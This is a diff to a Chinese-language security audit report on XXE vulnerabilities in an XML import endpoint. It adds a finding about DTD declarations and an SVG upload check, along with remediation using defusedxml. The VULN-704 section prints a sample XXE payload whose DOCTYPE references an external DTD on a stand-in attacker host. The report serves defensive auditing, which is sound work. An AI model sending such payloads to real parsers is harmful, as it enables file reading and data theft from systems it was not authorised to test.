@@ -16,6 +16,8 @@
   - [VULN-701：XXE — 任意文件读取](#vuln-701xxe--任意文件读取)
   - [VULN-702：XXE — 错误信息泄露](#vuln-702xxe--错误信息泄露)
   - [VULN-703：XXE — 亿 laugh 拒绝服务攻击](#vuln-703xxe--亿-laugh-拒绝服务攻击)
+  - [VULN-704：XXE — DTD 外部引用未禁止](#vuln-704xxe--dtd-外部引用未禁止)
+  - [VULN-705：SVG XXE 隐患](#vuln-705svg-xxe-隐患)
 - [四、修复方案](#四修复方案)
 - [五、修复前后对比](#五修复前后对比)
 - [六、修复验证](#六修复验证)
@@ -29,13 +31,14 @@
 
 在本次安全审计中，对 **XML 数据导入功能**（`/xml-import`）进行了全面的 XXE（XML External Entity，XML 外部实体注入）漏洞排查。该功能使用正则表达式手动提取 `<!ENTITY ... SYSTEM>` 中的文件路径并读取本地文件，存在严重的 XXE 漏洞。
 
-共发现 **3 个 XXE 相关漏洞**，均为严重级，已全部修复。
+共发现 **5 个 XXE 相关漏洞**，其中 **4 个严重级**、**1 个低危**，已全部修复。
 
 | 指标 | 数值 |
 |------|------|
-| 总漏洞数 | 3 |
-| 严重（Critical） | 3 |
-| 已修复 | 3（100%） |
+| 总漏洞数 | 5 |
+| 严重（Critical） | 4 |
+| 低危（Low） | 1 |
+| 已修复 | 5（100%） |
 
 ### 什么是 XXE？
 
@@ -72,6 +75,8 @@ open("/etc/passwd").read()   ← 读取系统文件
 | VULN-701 | XXE — 任意文件读取 | CWE-611 | 🔴 严重 | ✅ 已修复 |
 | VULN-702 | XXE — 错误信息泄露 | CWE-209 | 🔴 严重 | ✅ 已修复 |
 | VULN-703 | XXE — 亿 laugh 拒绝服务 | CWE-776 | 🔴 严重 | ✅ 已修复 |
+| VULN-704 | XXE — DTD 外部引用未禁止 | CWE-611 | 🟢 低危 | ✅ 已修复 |
+| VULN-705 | XXE — SVG XXE 隐患（非本功能） | CWE-611 | 🟢 低危 | ✅ 已确认安全 |
 
 ---
 
@@ -205,6 +210,59 @@ except Exception as e:
 | 内存耗尽 | 实体展开消耗大量内存，导致 OOM |
 | CPU 高负载 | 递归解析占用 CPU |
 | 服务不可用 | 内存耗尽导致应用崩溃或操作系统 OOM Killer |
+
+---
+
+### VULN-704：XXE — DTD 外部引用未禁止
+
+| 属性 | 值 |
+|------|----|
+| 漏洞类型 | DTD External Reference Allowed |
+| CWE 编号 | CWE-611: Improper Restriction of XML External Entity Reference |
+| 风险等级 | 🟢 低危 |
+
+#### 问题分析
+
+`defusedxml.ElementTree.fromstring()` 默认 `forbid_dtd=False`，允许 DTD 声明但不允许其中定义实体。虽然 ElementTree 不会实际拉取外部 DTD 文件，但允许 DTD 声明仍然存在潜在风险：
+
+```xml
+<!-- 以下 XML 在修复前可通过解析（虽然不拉取外部DTD） -->
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+<users><user><name>test</name></user></users>
+```
+
+经测试确认 ElementTree **不会**发起网络请求拉取外部 DTD（耗时 0.000s），但出于纵深防御原则应显式禁止。
+
+#### 修复方案
+
+```python
+# 修复前（默认 allow_dtd=True）
+root = ET.fromstring(xml_data)
+
+# 修复后（显式禁止 DTD）
+root = ET.fromstring(xml_data, forbid_dtd=True, forbid_entities=True, forbid_external=True)
+```
+
+---
+
+### VULN-705：SVG XXE 隐患（跨功能检查）
+
+| 属性 | 值 |
+|------|----|
+| 漏洞类型 | Cross-Function XXE via SVG Upload |
+| CWE 编号 | CWE-611 |
+| 风险等级 | 🟢 低危（已确认不可利用） |
+
+#### 问题分析
+
+SVG 文件本质上是 XML，如果上传功能允许 SVG 格式，攻击者可在 SVG 中嵌入 XXE payload，上传后通过浏览器访问即可触发。检查上传功能配置：
+
+```python
+ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp"}  # SVG 不在白名单中
+```
+
+**结论：** SVG 扩展名不在白名单中，且魔数校验会拦截伪装成图片的 XML 文件。✅ 确认安全
 
 ---
 
@@ -374,6 +432,7 @@ curl -X POST http://127.0.0.1:5000/xml-import \
 |--------|------|----------|
 | 🔴 P0 | 移除手动 ENTITY 提取 + open() 文件读取 | VULN-701 |
 | 🔴 P0 | 使用 defusedxml 替代 xml.etree.ElementTree | VULN-701, VULN-703 |
+| 🔴 P0 | 显式配置 forbid_dtd=True（纵深防御） | VULN-704 |
 | 🔴 P0 | 统一错误信息，不泄露异常细节 | VULN-702 |
 
 ### XML 解析库安全性对比
